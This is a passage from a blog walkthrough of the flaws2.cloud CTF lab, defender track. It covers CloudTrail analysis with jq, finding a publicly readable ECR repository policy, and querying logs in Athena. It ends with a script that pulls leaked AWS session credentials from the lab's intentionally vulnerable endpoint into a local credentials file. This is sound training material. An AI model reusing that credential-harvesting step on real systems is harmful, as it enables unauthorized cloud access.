16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre><td class="rouge-code"><pre><span class="c"># Looking at earlier events from the CloudTrail logs, we'll see level1 calling ListImages, BatchGetImage, and GetDownloadUrlForLayer.</span>
<span class="c"># Again, this is a compromised session credential, but we also want to see what happened here.</span>

<span class="c"># Let's work our way backward through the hack by first</span>
find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> | jq <span class="s1">'.Records[]|select(.eventName=="ListImages")'</span>
<span class="c"># {</span>
<span class="c">#   "eventVersion": "1.04",</span>
<span class="c">#   "userIdentity": {</span>
<span class="c">#     "type": "AssumedRole",</span>
<span class="c">#     "principalId": "AROAIBATWWYQXZTTALNCE:level1",</span>
<span class="c">#     "arn": "arn:aws:sts::653711331788:assumed-role/level1/level1",</span>
<span class="c">#     "accountId": "653711331788",</span>
<span class="c">#     "accessKeyId": "ASIAZQNB3KHGIGYQXVVG",</span>
<span class="c">#     "sessionContext": {</span>
<span class="c">#       "attributes": { "mfaAuthenticated": "false",</span>
<span class="c">#                       "creationDate": "2018-11-28T23:03:12Z" },</span>
<span class="c">#       "sessionIssuer": { "type": "Role",</span>
<span class="c">#                          "principalId": "AROAIBATWWYQXZTTALNCE",</span>
<span class="c">#                          "arn": "arn:aws:iam::653711331788:role/service-role/level1",</span>
<span class="c">#                          "accountId": "653711331788",</span>
<span class="c">#                          "userName": "level1" }</span>
<span class="c">#     }</span>
<span class="c">#   },</span>
<span class="c">#   "eventTime": "2018-11-28T23:05:53Z",</span>
<span class="c">#   "eventSource": "ecr.amazonaws.com",</span>
<span class="c">#   "eventName": "ListImages",</span>
<span class="c">#   "awsRegion": "us-east-1",</span>
<span class="c">#   "sourceIPAddress": "104.102.221.250",</span>
<span class="c">#   "userAgent": "aws-cli/1.16.19 Python/2.7.10 Darwin/17.7.0 botocore/1.12.9",</span>
<span class="c">#   "requestParameters": { "repositoryName": "level2",</span>
<span class="c">#                          "registryId": "653711331788" },</span>
<span class="c">#   "responseElements": null,</span>
<span class="c">#   "requestID": "2780d808-f362-11e8-b13e-dbd4ed9d7936",</span>
<span class="c">#   "eventID": "eb0fa4a0-580f-4270-bd37-7e45dfb217aa",</span>
<span class="c">#   "resources": [ { "ARN": "arn:aws:ecr:us-east-1:653711331788:repository/level2",</span>
<span class="c">#                    "accountId": "653711331788" } ],</span>
<span class="c">#   "eventType": "AwsApiCall",</span>
<span class="c">#   "recipientAccountId": "653711331788"</span>
<span class="c"># }</span>


<span class="c"># We can see the ListImages call event contains "repositoryName": "level2"</span>
<span class="c"># We can check the policy by running:</span>
aws ecr get-repository-policy <span class="se">\</span>
    <span class="nt">--repository-name</span> level2 <span class="se">\</span>
    <span class="nt">--profile</span> target_security
<span class="c"># {</span>
<span class="c">#     "registryId": "653711331788",</span>
<span class="c">#     "repositoryName": "level2",</span>
<span class="c">#     "policyText": "{\n  \"Version\" : \"2008-10-17\",\n  \"Statement\" : [ {\n    \"Sid\" : \"AccessControl\",\n    \"Effect\" : \"Allow\",\n    \"Principal\" : \"*\",\n    \"Action\" : [ \"ecr:GetDownloadUrlForLayer\", \"ecr:BatchGetImage\", \"ecr:BatchCheckLayerAvailability\", \"ecr:ListImages\", \"ecr:DescribeImages\" ]\n  } ]\n}"</span>
<span class="c"># }</span>

<span class="c"># clean that up</span>
aws ecr get-repository-policy <span class="se">\</span>
    <span class="nt">--repository-name</span> level2 <span class="se">\</span>
    <span class="nt">--profile</span> target_security | jq <span class="s1">'.policyText|fromjson'</span>

<span class="c"># {</span>
<span class="c">#     "Version": "2008-10-17",</span>
<span class="c">#     "Statement": [</span>
<span class="c">#         {</span>
<span class="c">#         "Sid": "AccessControl",</span>
<span class="c">#         "Effect": "Allow",</span>
<span class="c">#         "Principal": "*",</span>
<span class="c">#         "Action": [</span>
<span class="c">#             "ecr:GetDownloadUrlForLayer",</span>
<span class="c">#             "ecr:BatchGetImage",</span>
<span class="c">#             "ecr:BatchCheckLayerAvailability",</span>
<span class="c">#             "ecr:ListImages",</span>
<span class="c">#             "ecr:DescribeImages"</span>
<span class="c">#         ]</span>
<span class="c">#         }</span>
<span class="c">#     ]</span>
<span class="c"># }</span>


<span class="c"># Principal is "*": these actions are public to the world to perform, which means this ECR is public.</span>
<span class="c"># Ideally, you'd use a tool like CloudMapper to scan an account for public resources like this before you trace back an attack</span>
</pre></table></code></div></div><hr /><h2 id="objective-6-use-athena">Objective 6: Use Athena</h2><p>Athena is great for incident response</p><ul><li>because you don’t have to wait for the data to load anywhere,<li>just define the table in Athena and start querying it.<li>should also create partitions which will reduce costs by helping query only against a specific day.</ul><ol><li><p>exploring the logs in a similar as jq, by using the AWS Service Athena.</p><li>In the query editor, run:<ul><li><img data-proofer-ignore data-src="https://i.imgur.com/LVDAv9T.png" width="400" /></ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> create database flaws2<span class="p">;</span>
</pre></table></code></div></div><li>Switch to the flaws2 database just created and run:<ul><li><img data-proofer-ignore data-src="https://i.imgur.com/PYHebTN.png" width="600" /></ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre> CREATE EXTERNAL TABLE <span class="sb">`</span>cloudtrail<span class="sb">`</span><span class="o">(</span>
     <span class="sb">`</span>eventversion<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>useridentity<span class="sb">`</span> struct&lt;<span class="nb">type</span>:string,principalid:string,arn:string,accountid:string,invokedby:string,accesskeyid:string,username:string,sessioncontext:struct&lt;attributes:struct&lt;mfaauthenticated:string,creationdate:string&gt;,sessionissuer:struct&lt;<span class="nb">type</span>:string,principalid:string,arn:string,accountid:string,username:string&gt;&gt;&gt; COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>eventtime<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>eventsource<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>eventname<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>awsregion<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>sourceipaddress<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>useragent<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>errorcode<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>errormessage<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>requestparameters<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>responseelements<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>additionaleventdata<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>requestid<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>eventid<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>resources<span class="sb">`</span> array&lt;struct&lt;arn:string,accountid:string,type:string&gt;&gt; COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>eventtype<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>apiversion<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span><span class="nb">readonly</span><span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>recipientaccountid<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>serviceeventdetails<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>sharedeventid<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span>,
     <span class="sb">`</span>vpcendpointid<span class="sb">`</span> string COMMENT <span class="s1">'from deserializer'</span><span class="o">)</span>
 ROW FORMAT SERDE
     <span class="s1">'com.amazon.emr.hive.serde.CloudTrailSerde'</span>
 STORED AS INPUTFORMAT
     <span class="s1">'com.amazon.emr.cloudtrail.CloudTrailInputFormat'</span>
 OUTPUTFORMAT
     <span class="s1">'org.apache.hadoop.hive.ql.io.HiveIgnoreKeyTextOutputFormat'</span>
 LOCATION
     <span class="s1">'s3://flaws2-logs/AWSLogs/653711331788/CloudTrail'</span><span class="p">;</span>
</pre></table></code></div></div><li>now run:<ul><li><img data-proofer-ignore data-src="https://i.imgur.com/iigAbZS.png" width="600" /></ul><pre><code class="language-SQL"> select eventtime, eventname from cloudtrail;
</code></pre><li><p>run normal SQL queries against this data</p><pre><code class="language-SQL"> SELECT eventname, count(*) AS mycount
 FROM cloudtrail
 GROUP BY eventname
 ORDER BY mycount;
</code></pre></ol><hr /><h1 id="script-2">script</h1><h2 id="reobtain-the-credential">reobtain the credential</h2><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="c"># A python2 utility “crudini”</span>
pip2 <span class="nb">install</span> — user crudini
<span class="c"># jq — awesome json processor</span>
brew <span class="nb">install </span>jq

vim run.sh
<span class="c">#!/bin/bash</span>
<span class="nv">INFILE</span><span class="o">=</span>~/.aws/credentials
<span class="nv">PROFILE</span><span class="o">=</span><span class="s1">'flaws2'</span>

<span class="nv">res</span><span class="o">=</span><span class="sb">`</span>curl <span class="nt">-s</span> <span class="s1">'https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=x'</span> | <span class="nb">tail</span> <span class="nt">-n1</span><span class="sb">`</span>
<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$res</span> | jq <span class="nt">-r</span> .AWS_ACCESS_KEY_ID<span class="sb">`</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$res</span> | jq <span class="nt">-r</span> .AWS_SECRET_ACCESS_KEY<span class="sb">`</span>
<span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$res</span> | jq <span class="nt">-r</span> .AWS_SESSION_TOKEN<span class="sb">`</span>
<span class="nv">AWS_REGION</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$res</span> | jq <span class="nt">-r</span> .AWS_REGION<span class="sb">`</span>

<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$PROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$AWS_SECRET_ACCESS_KEY</span><span class="s2">
AWS_SESSION_TOKEN = </span><span class="nv">$AWS_SESSION_TOKEN</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>

<span class="nb">echo</span> <span class="s2">"Set creds for profile </span><span class="nv">$PROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/lab/'>Lab</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/flaws/" class="post-tag no-text-decoration" >Flaws</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Lab - CTF：Flaw2.cloud [attacker and defender] - Grace&url=https://ocholuo.github.io//posts/flaw2/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Lab - CTF：Flaw2.cloud [attacker and defender] - Grace&u=https://ocholuo.github.io//posts/flaw2/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Lab - CTF：Flaw2.cloud [attacker and defender] - Grace&url=https://ocholuo.github.io//posts/flaw2/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/flaw/"><div class="card-body"> <span class="timeago small" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - CTF：Flaw1.cloud [Level 1 - Level 6]</h3><div class="text-muted small"><p> [toc] CTF：Flaw1 [Level 1 - Level 6] Level 1 - list S3 from outside http://flaws.cloud/ This level is *buckets* of fun. See if you can find the first sub-domain The site flaws....</p></div></div></a></div><div class="card"> <a href="/posts/CloudGoat/"><div class="card-body"> <span class="timeago small" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - CloudGoat [Level 1 - Level 8]</h3><div class="text-muted small"><p> [toc] CloudGoat (☁️🐐) CloudGoat is Rhino Security Labs’ “Vulnerable by Design” AWS deployment tool. CloudGoat is Rhino Security Labs’ “Vulnerable by Design” AWS deployment tool. It al...</p></div></div></a></div><div class="card"> <a href="/posts/cicada3301/"><div class="card-body"> <span class="timeago small" >Apr 2, 2021<i class="unloaded">2021-04-02T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - Cicada 3301</h3><div class="text-muted small"><p> [toc] ref Cicada 3301:一只潜伏于互联网深处的“蝉”（一） 蝉3301（2012 PUZZLES）:互联网史上最复杂最神秘最可怕的谜团 Cicada 3301 2012年1月4日 将这张图片用记事本打开，在一堆乱码后面，隐藏着一条讯息： ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/flaw/" class="btn btn-outline-primary" prompt="Older"><p>Lab - CTF：Flaw1.cloud [Level 1 - Level 6]</p></a> <a href="/posts/01.intro/" class="btn btn-outline-primary" prompt="Newer"><p>Ansible - Basic</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
